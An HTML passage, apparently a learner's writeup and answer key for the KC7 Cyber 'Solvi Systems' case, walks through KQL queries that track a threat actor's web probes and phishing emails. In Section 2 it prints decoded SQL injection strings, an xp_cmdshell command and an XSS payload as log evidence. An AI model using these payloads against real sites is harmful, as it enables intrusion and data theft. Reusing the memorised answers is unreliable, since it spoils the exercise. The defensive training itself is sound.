<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>shoutvoid - kc7cyber writeup - easy - solvi systems</title>
    <link rel = "stylesheet" href = "../../../css/variables.css">
    <link rel = "stylesheet" href = "../../../css/style.css">
    <link rel = "stylesheet" href = "../../../css/kc7writeup.css">
  </head>
  <body id="top">
    <header><!--website header-->
      <h1>shoutvoid</h1>
      <p>Aspiring cybersecurity professional</p>
    </header><!--website header-->
    <nav class="site-nav"> <!--site-wide navigation-->
      <a href="../../../index.html">About</a>
      <a href="../../writeups.html">Writeups</a>
    </nav> <!--site-wide navigation-->
    <nav class="page-nav" id="page-navigation"> <!--page navigation sidebar-->
      <ol class="page-toc"><!--page toc-->
        <a class="skip" href="#page-main">Skip to main content</a>
        <li><a href="#intro">Introduction</a></li><!--link to intro-->
        <li><a href=#sections>Sections</a><!--all sections-->
          <ol class="section-toc"><!--section-toc-->
            <li class="section1-toc"><!--individual section toc-->
              <a href=#section1>Section 1 - KQL 101</a>
              <ol class="sub-toc"><!--sub-toc-->
                <li><a href=#question1>Q1</a></li>
                <li><a href=#question2>Q2</a></li>
                <li><a href=#question3>Q3</a></li>
                <li><a href=#question4>Q4</a></li>
                <li><a href=#question5>Q5</a></li>
                <li><a href=#question6>Q6</a></li>
                <li><a href=#question7>Q7</a></li>
                <li><a href=#question8>Q8</a></li>
                <li><a href=#question9>Q9</a></li>
                <li><a href=#question10>Q10</a></li>
                <li><a href=#question11>Q11</a></li>
                <li><a href=#question12>Q12</a></li>
              </ol><!--sub-toc-->
            </li><!--individual section toc-->
            <li class="section2-toc"><!--individual section toc-->
              <a href=#section2>Section 2 - Someone's Knocking</a>
              <ol class="sub-toc"><!--sub-toc-->
                <li><a href=#question13>Q1</a></li>
                <li><a href=#question14>Q2</a></li>
                <li><a href=#question15>Q3</a></li>
                <li><a href=#question16>Q4</a></li>
                <li><a href=#question17>Q5</a></li>
                <li><a href=#question18>Q6</a></li>
                <li><a href=#question19>Q7</a></li>
                <li><a href=#question20>Q8</a></li>
                <li><a href=#question21>Q9</a></li>
                <li><a href=#question22>Q10</a></li>
                <li><a href=#question23>Q11</a></li>
                <li><a href=#question24>Q12</a></li>
                <li><a href=#question25>Q13</a></li>
              </ol><!--sub-toc-->
            </li><!--individual section toc-->
            <li class="section3-toc"><!--individual section toc-->
              <a href=#section3>Section 3 - Snail Mail</a>
              <ol class="sub-toc"><!--sub-toc-->
                <li><a href=#question26>Q1</a></li>
                <li><a href=#question27>Q2</a></li>
                <li><a href=#question28>Q3</a></li>
                <li><a href=#question29>Q4</a></li>
                <li><a href=#question30>Q5</a></li>
                <li><a href=#question31>Q6</a></li>
                <li><a href=#question32>Q7</a></li>
                <li><a href=#question33>Q8</a></li>
                <li><a href=#question34>Q9</a></li>
                <li><a href=#question35>Q10</a></li>
                <li><a href=#question36>Q11</a></li>
                <li><a href=#question37>Q12</a></li>
                <li><a href=#question38>Q13</a></li>
                <li><a href=#question39>Q14</a></li>
                <li><a href=#question40>Q15</a></li>
                <li><a href=#question41>Q16</a></li>
              </ol><!--sub-toc-->
            </li><!--individual section toc-->
            <li class="section4-toc"><!--individual section toc-->
              <a href=#section4>Section 4 - EcoShock</a>
              <ol class="sub-toc"><!--sub-toc-->
                <li><a href=#question42>Q1</a></li>
                <li><a href=#question43>Q2</a></li>
                <li><a href=#question44>Q3</a></li>
                <li><a href=#question45>Q4</a></li>
                <li><a href=#question46>Q5</a></li>
                <li><a href=#question47>Q6</a></li>
                <li><a href=#question48>Q7</a></li>
                <li><a href=#question49>Q8</a></li>
                <li><a href=#question50>Q9</a></li>
                <li><a href=#question51>Q10</a></li>
                <li><a href=#question52>Q11</a></li>
              </ol><!--sub-toc-->
            </li><!--individual section toc-->
            <li class="section5-toc"><!--individual section toc-->
              <a href=#section5>Section 5 - A Shocking Ending</a>
              <ol class="sub-toc"><!--sub-toc-->
                <li><a href=#question53>Q1</a></li>
                <li><a href=#question54>Q2</a></li>
                <li><a href=#question55>Q3</a></li>
                <li><a href=#question56>Q4</a></li>
                <li><a href=#question57>Q5</a></li>
                <li><a href=#question58>Q6</a></li>
                <li><a href=#question59>Q7</a></li>
                <li><a href=#question60>Q8</a></li>
                <li><a href=#question61>Q9</a></li>
                <li><a href=#question62>Q10</a></li>
                <li><a href=#question63>Q11</a></li>
                <li><a href=#question64>Q12</a></li>
                <li><a href=#question65>Q13</a></li>
                <li><a href=#question66>Q14</a></li>
                <li><a href=#question67>Q15</a></li>
              </ol><!--sub-toc-->
            </li><!--individual section toc-->
          </ol><!--section-toc-->
        </li><!--all sections-->
      </ol> <!--page-toc class-->
    </nav> <!--page navigation sidebar-->
    <main id="page-main"> <!--main page content-->
      <article id="intro"> <!--introduction-->
        <h1>Solvi Systems</h1>
        <p>In this case, we take on the role of a security analyst tasked to identify any intrusions (attempted or successful) against Solvi Systems, a company that provides the DOCKS ICS software that powers much of the South African energy industry--and plays a key role in the wider regional landscape. This case has <a href="https://kc7cyber.com/guide/148">a training guide</a> that provides lore and KQL tips.</p>
        <p>Within the training guide we're provided with an "Actor Preview" document, used to keep track of the information we find on the threat actor, such as code names, affilitations, operating regions, motivations, a summary, initial access vectors, post-exploitation activity, command and control, exfiltration and impact, an appendix for indicators of compromise (IoC) and analyst notes.</p>
        <p>Fun fact: was the fourth case in line until March 2025's KQL 101 was added; Solvi Systems is now the fifth.</p>
      </article> <!--introduction-->
      <article id=sections><!--the game sections-->
        <h2>Sections</h2>
        <section id="section1"><!--section 1-->
          <h3>Section 1 - KQL 101</h3>
          <!--the card containing the answers, composed of three elements: the KQL query used, the answer as typed on KC7 Cyber, and a comment-->
          <section class="question-card" id="question1"> <!--question 1-->
            <h4>Q1 - Enter <i>ready</i> to get started</h4>
            <div class="kql-query">
              <h5>Query</h5>
              <pre><code></code></pre>
            </div>
            <div class="answer-card">
              <h5>Answer</h5>
              <p>ready</p>
            </div>
            <div class="comment-card">
              <h5>Comments</h5>
              <p>An introductory question that gives us the lore, if you will, for this case. Solvi Systems plays a key role in the energy sector of South Africa and its neighboring states, with its Docks software being a critical component to these delicate operations.</p>
            </div>
          </section> <!--question 1-->
          <section class="question-card" id="question2"> <!--question 2-->
            <h4>Q2 - Type "done" to earn credit for this question.</h4>
            <div class="kql-query">
              <h5>Query</h5>
              <pre><code>Employees
| take 10
//highlight each one to run individually
Email
| take 10

AuthenticationEvents
| take 10

SecurityAlerts
| take 10

PassiveDns
| take 10

FileCreationEvents
| take 10

ProcessEvents
| take 10

InboundNetworkEvents
| take 10

OutboundNetworkEvents
| take 10</code></pre>
            </div>
            <div class="answer-card">
              <h5>Answer</h5>
              <p>done</p>
            </div>
            <div class="comment-card">
              <h5>Comments</h5>
              <p>We don't <i>have</i> to do this (but I did it anyway). This is simply a basic tutorial on the <code>take</code> query. It's also a good exercise to familiarize yourself with the tables available and each of its rows.</p>
            </div>
          </section> <!--question 2-->
          <section class="question-card" id="question3"> <!--question 3-->
            <h4>Q3 - How many employees work at Solvi Systems?</h4>
            <div class="kql-query">
              <h5>Query</h5>
              <pre><code>Employees
| count</code></pre>
            </div>
            <div class="answer-card">
              <h5>Answer</h5>
              <p>500</p>
            </div>
            <div class="comment-card">
              <h5>Comments</h5>
              <p>A fun (and useful!) thing to do is a query where, instead of <code>count</code>, we use <code>summarize count() by role</code>. Solvi Systems is overwhelmingly staffed by ICS Software Devs!</p>
            </div>
          </section> <!--question 3-->
          <section class="question-card" id="question4"> <!--question 4-->
            <h4>Q4 - What is the CTO's name?</h4>
            <div class="kql-query">
              <h5>Query</h5>
              <pre><code>Employees
| where role == "CTO"</code></pre>
            </div>
            <div class="answer-card">
              <h5>Answer</h5>
              <p>Alexis Khoza</p>
            </div>
            <div class="comment-card">
              <h5>Comments</h5>
              <p></p>
            </div>
          </section> <!--question 4-->
          <section class="question-card" id="question5"> <!--question 5-->
            <h4>Q5 - How many emails did Alexis Khoza receive?</h4>
            <div class="kql-query">
              <h5>Query</h5>
              <pre><code>Employees
| where role == "CTO"
| lookup Email on $left.email_addr == $right.recipient
| count</code></pre>
            </div>
            <div class="answer-card">
              <h5>Answer</h5>
              <p>31</p>
            </div>
            <div class="comment-card">
              <h5>Comments</h5>
              <p><code>lookup</code> my beloved. Join those tables!</p>
            </div>
          </section> <!--question 5-->
          <section class="question-card" id="question6"> <!--question 6-->
            <h4>Q6 - How many distinct senders were seen in the email logs from eskom[.]co[.]za?</h4>
            <div class="kql-query">
              <h5>Query</h5>
              <pre><code>Email
| where sender has "eskom[.]co[.]za"
| distinct sender
| count</code></pre>
            </div>
            <div class="answer-card">
              <h5>Answer</h5>
              <p>745</p>
            </div>
            <div class="comment-card">
              <h5>Comments</h5>
              <p>Eskom is a real South African public utility. [<a href="https://en.wikipedia.org/wiki/Eskom">Wikipedia</a>]</p>
            </div>
          </section> <!--question 6-->
          <section class="question-card" id="question7"> <!--question 7-->
            <h4>Q7 - How many distinct websites did “Alexis Khoza” visit?</h4>
            <div class="kql-query">
              <h5>Query</h5>
              <pre><code>Employees
| where role == "CTO"
| lookup OutboundNetworkEvents on $left.ip_addr == $right.src_ip
| distinct url
| count</code></pre>
            </div>
            <div class="answer-card">
              <h5>Answer</h5>
              <p>72</p>
            </div>
            <div class="comment-card">
              <h5>Comments</h5>
              <p>I will never not use <code>lookup</code>. Do not forget the <code>distinct</code> keyword!</p>
            </div>
          </section> <!--question 7-->
          <section class="question-card" id="question8"> <!--question 8-->
            <h4>Q8 - How many distinct domains in the PassiveDns records contain the word “real”?</h4>
            <div class="kql-query">
              <h5>Query</h5>
              <pre><code>PassiveDns
| where domain contains "real"
| distinct domain
| count</code></pre>
            </div>
            <div class="answer-card">
              <h5>Answer</h5>
              <p>19</p>
            </div>
            <div class="comment-card">
              <h5>Comments</h5>
              <p></p>
            </div>
          </section> <!--question 8-->
          <section class="question-card" id="question9"> <!--question 9-->
            <h4>Q9 - What IPs did the domain “bit[.]ly” resolve to (enter any one of them)?</h4>
            <div class="kql-query">
              <h5>Query</h5>
              <pre><code>PassiveDns
| where domain == "bit[.]ly"
| distinct ip</code></pre>
            </div>
            <div class="answer-card">
              <h5>Answer</h5>
              <p>219[.]82[.]23[.]42</p>
            </div>
            <div class="comment-card">
              <h5>Comments</h5>
              <p>It resolves to 10 distinct IP addresses. This query is quite useful when paired with variables, so remember it.</p>
            </div>
          </section> <!--question 9-->
          <section class="question-card" id="question10"> <!--question 10-->
            <h4>Q10 - How many distinct URLs did employees with the first name "Mary" Visit?</h4>
            <div class="kql-query">
              <h5>Query</h5>
              <pre><code>Employees
| where name has "Mary"
| distinct ip_addr
| lookup OutboundNetworkEvents on $left.ip_addr == $right.src_ip
| distinct url
| count</code></pre>
            </div>
            <div class="answer-card">
              <h5>Answer</h5>
              <p>847</p>
            </div>
            <div class="comment-card">
              <h5>Comments</h5>
              <p>This question is meant to introduce variables and here I am willfully ignoring it and doing my own queries. <code>lookup</code> my beloved.</p>
            </div>
          </section> <!--question 10-->
          <section class="question-card" id="question11"> <!--question 11-->
            <h4>Q11 - How many authentication attempts did we see to the accounts of employees with the first name Mary?</h4>
            <div class="kql-query">
              <h5>Query</h5>
              <pre><code>Employees
| where name has "Mary"
| distinct username
| lookup AuthenticationEvents on $left.username == $right.username
| count</code></pre>
            </div>
            <div class="answer-card">
              <h5>Answer</h5>
              <p>1150</p>
            </div>
            <div class="comment-card">
              <h5>Comments</h5>
              <p></p>
            </div>
          </section> <!--question 11-->
          <section class="question-card" id="question12"> <!--question 12-->
            <h4>Q12 - Enter "ready" to earn credit for this question.</h4>
            <div class="kql-query">
              <h5>Query</h5>
              <pre><code></code></pre>
            </div>
            <div class="answer-card">
              <h5>Answer</h5>
              <p>ready</p>
            </div>
            <div class="comment-card">
              <h5>Comments</h5>
              <p>We're briefly congratulated for passing the tutorial and invited to continue.</p>
            </div>
          </section> <!--question 12-->
        </section> <!--section 1-->
        <section id="section2"><!--section 2-->
          <h3>Section 2 - Someone's Knocking</h3>
          <!--the card containing the answers, composed of three elements: the KQL query used, the answer as typed on KC7 Cyber, and a comment-->
          <section class="question-card" id="question13"> <!--question 1-->
            <h4>Q1 - What kind of attack does the alert suggest happened?</h4>
            <div class="kql-query">
              <h5>Query</h5>
              <pre><code></code></pre>
            </div>
            <div class="answer-card">
              <h5>Answer</h5>
              <p>xss</p>
            </div>
            <div class="comment-card">
              <h5>Comments</h5>
              <p>We're shown a brief snippet of a Web Application Firewall alert. The description of the alert is that a detection rule was triggered, the severity is high, and the rule is described as detecting suspicious text in a HTTP request. The data that triggered it shows an attempt at a cross site scripting attack.</p>
            </div>
          </section> <!--question 1-->
          <section class="question-card" id="question14"> <!--question 2-->
            <h4>Q2 - What was the javascript command the attacker was trying to run?</h4>
            <div class="kql-query">
              <h5>Query</h5>
              <pre><code>InboundNetworkEvents
| where url contains "alert"</code></pre>
            </div>
            <div class="answer-card">
              <h5>Answer</h5>
              <p>alert('xss')</p>
            </div>
            <div class="comment-card">
              <h5>Comments</h5>
              <p>We're prompted to check the <code>InboundNetworkEvents</code> table for the flagged event. The answer is in the <code>url</code> column, though the encoding makes it hard to read. Decoding it with CyberChef gives us hxxps[://]www[.]solvisystems[.]com/feedback?message=&lt;/script>&lt;script>alert('xss')&lt;/script></p>
            </div>
          </section> <!--question 2-->
          <section class="question-card" id="question15"> <!--question 3-->
            <h4>Q3 - What response code did they receive from the website?</h4>
            <div class="kql-query">
              <h5>Query</h5>
              <pre><code></code></pre>
            </div>
            <div class="answer-card">
              <h5>Answer</h5>
              <p>404</p>
            </div>
            <div class="comment-card">
              <h5>Comments</h5>
              <p>In the <code>status_code</code> column.</p>
            </div>
          </section> <!--question 3-->
          <section class="question-card" id="question16"> <!--question 4-->
            <h4>Q4 - What user agent did the attackers use to make the web requests in this attack? Enter only the initial part of the user agent (XXXXX/N.NN)</h4>
            <div class="kql-query">
              <h5>Query</h5>
              <pre><code></code></pre>
            </div>
            <div class="answer-card">
              <h5>Answer</h5>
              <p>Opera/8.64</p>
            </div>
            <div class="comment-card">
              <h5>Comments</h5>
              <p></p>
            </div>
          </section> <!--question 4-->
          <section class="question-card" id="question17"> <!--question 5-->
            <h4>Q5 - On what day did the attack happen? Give the timestamp in the format YYYY-MM-DD.</h4>
            <div class="kql-query">
              <h5>Query</h5>
              <pre><code></code></pre>
            </div>
            <div class="answer-card">
              <h5>Answer</h5>
              <p>2024-05-03</p>
            </div>
            <div class="comment-card">
              <h5>Comments</h5>
              <p>Remove the time (<code>T14:48:08Z</code>)</p>
            </div>
          </section> <!--question 5-->
          <section class="question-card" id="question18"> <!--question 6-->
            <h4>Q6 - How many malicious requests did the attacker make in total?</h4>
            <div class="kql-query">
              <h5>Query</h5>
              <pre><code>InboundNetworkEvents
| where user_agent == "Opera/8.64.(X11; Linux x86_64; kok-IN) Presto/2.9.165 Version/10.00"
| where timestamp between (datetime("2024-05-03") .. datetime("2024-05-05"))</code></pre>
            </div>
            <div class="answer-card">
              <h5>Answer</h5>
              <p>9</p>
            </div>
            <div class="comment-card">
              <h5>Comments</h5>
              <p>We're prompted to investigate malicious requests further. I opted not to use <code>lookup</code>, as the output (or more like, "why is the output like this") becomes somewhat confusing for the next questions. The timestamps are provided and corresponds to all events from the XSS attack until 2 days after.</p>
            </div>
          </section> <!--question 6-->
          <section class="question-card" id="question19"> <!--question 7-->
            <h4>Q7 - Were any of these attacks successful? (yes/no)</h4>
            <div class="kql-query">
              <h5>Query</h5>
              <pre><code></code></pre>
            </div>
            <div class="answer-card">
              <h5>Answer</h5>
              <p>no</p>
            </div>
            <div class="comment-card">
              <h5>Comments</h5>
              <p>The urls show attempts at various injection attacks. Decoded:</p>
              <ol>
                <li><code>hxxps[://]www[.]solvisystems[.]com/products?name=' OR '1'='1</code></li>
                <li><code>hxxps[://]www[.]solvisystems[.]com/search?q='; DROP TABLE users; --</code></li>
                <li><code>hxxps[://]www[.]solvisystems[.]com/api/data?user_id=1 UNION SELECT 1, username, password FROM users</code></li>
                <li><code>hxxps[://]www[.]solvisystems[.]com/api/auth?username=admin'--</code></li>
                <li><code>hxxps[://]www[.]solvisystems[.]com/api/settings?setting=' OR 1=1--</code></li>
                <li><code>hxxps[://]www[.]solvisystems[.]com/products/details?id=1 AND 1=1</code></li>
                <li><code>hxxps[://]www[.]solvisystems[.]com/search/results?query=';EXEC xp_cmdshell 'dir';--</code></li>
                <li><code>hxxps[://]www[.]solvisystems[.]com/download?file=' UNION SELECT system_user, @@version, db_name()--</code></li>
                <li><code>hxxps[://]www[.]solvisystems[.]com/feedback?message=&lt;/script>&lt;script>alert('xss')&lt;/script></code></li>
              </ol>
              <p>None were successful (returned status code 404, Page Not Found)</p>
            </div>
          </section> <!--question 7-->
          <section class="question-card" id="question20"> <!--question 8-->
            <h4>Q8 - What ip addresses did the requests originate from (enter any of them)</h4>
            <div class="kql-query">
              <h5>Query</h5>
              <pre><code>InboundNetworkEvents
| where user_agent == "Opera/8.64.(X11; Linux x86_64; kok-IN) Presto/2.9.165 Version/10.00"
| where timestamp between (datetime("2024-05-03") .. datetime("2024-05-05"))
| distinct src_ip</code></pre>
            </div>
            <div class="answer-card">
              <h5>Answer</h5>
              <p>98[.]117[.]26[.]236</p>
            </div>
            <div class="comment-card">
              <h5>Comments</h5>
              <p>By appending distinct src_ip to our query, we can get all the attacker IPs and avoid duplicates.</p>
              <ul>
                <li><code>56[.]6[.]30[.]190</code></li>
                <li><code>105[.]78[.]23[.]64</code></li>
                <li><code>98[.]117[.]26[.]236</code></li>
                <li><code>13[.]201[.]46[.]208</code></li>
              </ul>
            </div>
          </section> <!--question 8-->
          <section class="question-card" id="question21"> <!--question 9-->
            <h4>Q9 - How many total records do we have of them browsing Solvi Systems?</h4>
            <div class="kql-query">
              <h5>Query</h5>
              <pre><code>InboundNetworkEvents
| where user_agent == "Opera/8.64.(X11; Linux x86_64; kok-IN) Presto/2.9.165 Version/10.00"</code></pre>
            </div>
            <div class="answer-card">
              <h5>Answer</h5>
              <p>64</p>
            </div>
            <div class="comment-card">
              <h5>Comments</h5>
              <p>All queries originating from the malicious user agent.</p>
            </div>
          </section> <!--question 9-->
          <section class="question-card" id="question22"> <!--question 10-->
            <h4>Q10 - What is the timestamp of the first web request the threat actor sent to Solvi System's website?</h4>
            <div class="kql-query">
              <h5>Query</h5>
              <pre><code></code></pre>
            </div>
            <div class="answer-card">
              <h5>Answer</h5>
              <p>2024-05-01T00:00:00Z</p>
            </div>
            <div class="comment-card">
              <h5>Comments</h5>
              <p>They looked at Solvi Systems' about us page.</p>
            </div>
          </section> <!--question 10-->
          <section class="question-card" id="question23"> <!--question 11-->
            <h4>Q11 - Which product did the threat actors research before the day that they sent the malicious web requests?</h4>
            <div class="kql-query">
              <h5>Query</h5>
              <pre><code></code></pre>
            </div>
            <div class="answer-card">
              <h5>Answer</h5>
              <p>docks ics</p>
            </div>
            <div class="comment-card">
              <h5>Comments</h5>
              <p></p>
            </div>
          </section> <!--question 11-->
          <section class="question-card" id="question24"> <!--question 12-->
            <h4>Q12 - How many distinct domains do the ip addresses used by the threat actor resolve to?</h4>
            <div class="kql-query">
              <h5>Query</h5>
              <pre><code>let attacker_ips =
InboundNetworkEvents
| where user_agent == "Opera/8.64.(X11; Linux x86_64; kok-IN) Presto/2.9.165 Version/10.00"
| distinct src_ip;
PassiveDns
| where ip in (attacker_ips)
| distinct domain</code></pre>
            </div>
            <div class="answer-card">
              <h5>Answer</h5>
              <p>3</p>
            </div>
            <div class="comment-card">
              <h5>Comments</h5>
              <p>We get rid of the time range to make sure we don't miss any malicious IP addresses.</p>
              <p>The devilish domains are:</p>
              <ul>
                <li><code>energy-trends4u[.]net</code></li>
                <li><code>news-on-industry[.]com</code></li>
                <li><code>eco-awareness-update[.]net</code></li>
              </ul>
            </div>
          </section> <!--question 12-->
          <section class="question-card" id="question25"> <!--question 13-->
            <h4>Q13 - Did we received any emails containing these domains? (yes/no)</h4>
            <div class="kql-query">
              <h5>Query</h5>
              <pre><code>Email
| where link has "energy-trends4u[.]net"
or link has "news-on-industry[.]com"
or link has "eco-awareness-update[.]net"</code></pre>
            </div>
            <div class="answer-card">
              <h5>Answer</h5>
              <p>yes</p>
            </div>
            <div class="comment-card">
              <h5>Comments</h5>
              <p>Since these domains sure look suspicious, like "used for phishing" suspicious, we're invited to check if any emails sent to Solvi Systems employees contain these domains.</p>
              <p>Doing a query such as</p>
              <pre><code>Email
| where sender has "energy-trends4u[.]net"
or sender has "news-on-industry[.]com"
or sender has "eco-awareness-update[.]net"
or reply_to has "energy-trends4u[.]net"
or reply_to has "news-on-industry[.]com"
or reply_to has "eco-awareness-update[.]net"</code></pre>
              <p>Surprisingly doesn't give us any results. So, we must look at the links contained in the emails.</p>
              <p>Since it's good information to have written down, after getting the answer use a query like</p>
              <pre><code>Email
| where link has "energy-trends4u[.]net"
or link has "news-on-industry[.]com"
or link has "eco-awareness-update[.]net"
| distinct sender
//repeat with distinct reply_to instead to ensure we got them all</code></pre>
              <p>To get all the email addresses used by the threat actors.</p>
              <p>They are:</p>
              <ul>
                <li><code>newsATeco-awareness-updates[.]net</code></li>
                <li><code>energy_industry_newsATprotonmail[.]com</code></li>
                <li><code>electric_updatesATgmail[.]com</code></li>
              </ul>
            </div>
          </section> <!--question 13-->
        </section> <!--section 2-->
        <section id="section3"><!--section 3-->
          <h3>Section 3 - Snail Mail</h3>
          <!--the card containing the answers, composed of three elements: the KQL query used, the answer as typed on KC7 Cyber, and a comment-->
          <section class="question-card" id="question26"> <!--question 1-->
            <h4>Q1 - How many emails associated with these domains did SolviSystem employees receive?</h4>
            <div class="kql-query">
              <h5>Query</h5>
              <pre><code>Email
| where link has "energy-trends4u[.]net"
or link has "news-on-industry[.]com"
or link has "eco-awareness-update[.]net"
| count</code></pre>
            </div>
            <div class="answer-card">
              <h5>Answer</h5>
              <p>52</p>
            </div>
            <div class="comment-card">
              <h5>Comments</h5>
              <p></p>
            </div>
          </section> <!--question 1-->
          <section class="question-card" id="question27"> <!--question 2-->
            <h4>Q2 - How many distinct email addresses did the threat actor use?</h4>
            <div class="kql-query">
              <h5>Query</h5>
              <pre><code>Email
| where link has "energy-trends4u[.]net"
or link has "news-on-industry[.]com"
or link has "eco-awareness-update[.]net"
| distinct sender
//repeat with distinct reply_to instead to make sure we got them all</code></pre>
            </div>
            <div class="answer-card">
              <h5>Answer</h5>
              <p>3</p>
            </div>
            <div class="comment-card">
              <h5>Comments</h5>
              <p>As I said <a href="#question25">previously</a>...</p>
              <ul>
                <li><code>newsATeco-awareness-updates[.]net</code></li>
                <li><code>energy_industry_newsATprotonmail[.]com</code></li>
                <li><code>electric_updatesATgmail[.]com</code></li>
              </ul>
            </div>
          </section> <!--question 2-->
          <section class="question-card" id="question28"> <!--question 3-->
            <h4>Q3 - How many distinct filenames were observed in the links in these emails?</h4>
            <div class="kql-query">
              <h5>Query</h5>
              <pre><code>Email
| where link has "energy-trends4u[.]net"
or link has "news-on-industry[.]com"
or link has "eco-awareness-update[.]net"
| extend Filepath = tostring(parse_url(link).Path)
| extend Filename = tostring(parse_path(Filepath).Filename)
| distinct Filename</code></pre>
            </div>
            <div class="answer-card">
              <h5>Answer</h5>
              <p>3</p>
            </div>
            <div class="comment-card">
              <h5>Comments</h5>
              <p>This is a bit overkill (distinct link would've given the same results), but I think it's important to know and use things such as the parse_url and parse_path functions.</p>
              <p><code>parse_url(link).Path</code> extracts the path (remember that servers and webpages are nothing but a bunch of files and folders in a computer at the end of the day), meaning we get everything after the first / (/search/online/[...]). The <code>extend</code> keyword adds this information as a new column in our displayed results.</p>
              <p><code>parse_path(Filepath).Filename</code> extracts the file at the given location (i.e. given path), so that we get, for example, <code>Energy_Industry_Trends_2024_4_Solvi.docx</code> in a new column named <code>Filename</code>.</p>
              <p>This query can be really powerful when it's time to look for these files inside affected systems.</p>
            </div>
          </section> <!--question 3-->
          <section class="question-card" id="question29"> <!--question 4-->
            <h4>Q4 - How many different roles were targeted with these emails?</h4>
            <div class="kql-query">
              <h5>Query</h5>
              <pre><code>Email
| where link has "energy-trends4u[.]net"
or link has "news-on-industry[.]com"
or link has "eco-awareness-update[.]net"
| distinct recipient
| lookup Employees on $left.recipient == $right.email_addr
| distinct role
| count</code></pre>
            </div>
            <div class="answer-card">
              <h5>Answer</h5>
              <p>5</p>
            </div>
            <div class="comment-card">
              <h5>Comments</h5>
              <p><code>lookup</code> my beloved! You actually don't need the count keyword most times, as ADX shows how many rows were returned right above the result table.</p>
            </div>
          </section> <!--question 4-->
          <section class="question-card" id="question30"> <!--question 5-->
            <h4>Q5 - How many Customer Support Specialist employees received malicious emails?</h4>
            <div class="kql-query">
              <h5>Query</h5>
              <pre><code>Email
| where link has "energy-trends4u.net"
or link has "news-on-industry.com"
or link has "eco-awareness-update.net"
| distinct recipient
| lookup Employees on $left.recipient == $right.email_addr
| summarize count() by role</code></pre>
            </div>
            <div class="answer-card">
              <h5>Answer</h5>
              <p>27</p>
            </div>
            <div class="comment-card">
              <h5>Comments</h5>
              <p>The very first time I did this case I tried doing this by hand. Imagine that.</p>
              <p><code>summarize count() by role</code> does all that annoying busywork (and then some) for us.</p>
              <p>Note the other affected roles!</p>
            </div>
          </section> <!--question 5-->
          <section class="question-card" id="question31"> <!--question 6-->
            <h4>Q6 - Among these job roles, which word is shared by three of them?</h4>
            <div class="kql-query">
              <h5>Query</h5>
              <pre><code></code></pre>
            </div>
            <div class="answer-card">
              <h5>Answer</h5>
              <p>Docks</p>
            </div>
            <div class="comment-card">
              <h5>Comments</h5>
              <p>You remember what is SolviSystems' flagship product that is key to energy sector stability across South Africa and beyond, don't you?</p>
            </div>
          </section> <!--question 6-->
          <section class="question-card" id="question32"> <!--question 7-->
            <h4>Q7 - What was the timestamp of the first email the threat actor sent?</h4>
            <div class="kql-query">
              <h5>Query</h5>
              <pre><code></code></pre>
            </div>
            <div class="answer-card">
              <h5>Answer</h5>
              <p>2024-05-01T15:51:41Z</p>
            </div>
            <div class="comment-card">
              <h5>Comments</h5>
              <p>Go back to the <a href="#question25">S2 Q13</a> query.</p>
            </div>
          </section> <!--question 7-->
          <section class="question-card" id="question33"> <!--question 8-->
            <h4>Q8 - What is the recipient's email address?</h4>
            <div class="kql-query">
              <h5>Query</h5>
              <pre><code></code></pre>
            </div>
            <div class="answer-card">
              <h5>Answer</h5>
              <p>carla_whartonATsolvisystems[.]com</p>
            </div>
            <div class="comment-card">
              <h5>Comments</h5>
              <p></p>
            </div>
          </section> <!--question 8-->
          <section class="question-card" id="question34"> <!--question 9-->
            <h4>Q9 - What is that employee's name?</h4>
            <div class="kql-query">
              <h5>Query</h5>
              <pre><code></code></pre>
            </div>
            <div class="answer-card">
              <h5>Answer</h5>
              <p>Carla Wharton</p>
            </div>
            <div class="comment-card">
              <h5>Comments</h5>
              <p>Fortunately for us, SolviSystems' email addresses are simply <code>firstname_lastnameATsolvisystems[.]com</code>, sparing us a query.</p>
            </div>
          </section> <!--question 9-->
          <section class="question-card" id="question35"> <!--question 10-->
            <h4>Q10 - What was the sender address of that email?</h4>
            <div class="kql-query">
              <h5>Query</h5>
              <pre><code></code></pre>
            </div>
            <div class="answer-card">
              <h5>Answer</h5>
              <p>newsATeco-awareness-updates[.]net</p>
            </div>
            <div class="comment-card">
              <h5>Comments</h5>
              <p></p>
            </div>
          </section> <!--question 10-->
          <section class="question-card" id="question36"> <!--question 11-->
            <h4>Q11 - What was the reply to address?</h4>
            <div class="kql-query">
              <h5>Query</h5>
              <pre><code></code></pre>
            </div>
            <div class="answer-card">
              <h5>Answer</h5>
              <p>electric_updatesATgmail[.]com</p>
            </div>
            <div class="comment-card">
              <h5>Comments</h5>
              <p></p>
            </div>
          </section> <!--question 11-->
          <section class="question-card" id="question37"> <!--question 12-->
            <h4>Q12 - What was the subject of that email?</h4>
            <div class="kql-query">
              <h5>Query</h5>
              <pre><code></code></pre>
            </div>
            <div class="answer-card">
              <h5>Answer</h5>
              <p>[EXTERNAL] Business Opportunity: Two major energy companies merging</p>
            </div>
            <div class="comment-card">
              <h5>Comments</h5>
              <p></p>
            </div>
          </section> <!--question 12-->
          <section class="question-card" id="question38"> <!--question 13-->
            <h4>Q13 - What link was observed in the email?</h4>
            <div class="kql-query">
              <h5>Query</h5>
              <pre><code></code></pre>
            </div>
            <div class="answer-card">
              <h5>Answer</h5>
              <p>hxxp[://]news-on-industry[.]com/search/online/files/public/Energy_Industry_Trends_2024_4_Solvi[.]docx</p>
            </div>
            <div class="comment-card">
              <h5>Comments</h5>
              <p></p>
            </div>
          </section> <!--question 13-->
          <section class="question-card" id="question39"> <!--question 14-->
            <h4>Q14 - Did Carla click on the link in email? If so when?</h4>
            <div class="kql-query">
              <h5>Query</h5>
              <pre><code>Email
| where link has "energy-trends4u[.]net"
or link has "news-on-industry[.]com"
or link has "eco-awareness-update[.]net"
| where recipient == "carla_whartonATsolvisystems[.]com"
| distinct recipient
| lookup Employees on $left.recipient == $right.email_addr
| distinct ip_addr
| lookup OutboundNetworkEvents on $left.ip_addr == $right.src_ip
| where url has "news-on-industry[.]com"</code></pre>
            </div>
            <div class="answer-card">
              <h5>Answer</h5>
              <p>2024-05-01T15:57:41Z</p>
            </div>
            <div class="comment-card">
              <h5>Comments</h5>
              <p>Big query. I like building upon previous queries, if you haven't noticed.</p>
            </div>
          </section> <!--question 14-->
          <section class="question-card" id="question40"> <!--question 15-->
            <h4>Q15 - What file was observed on Carla's machine shortly after she executed the docx file?</h4>
            <div class="kql-query">
              <h5>Query</h5>
              <pre><code>Email
| where link has "energy-trends4u[.]net"
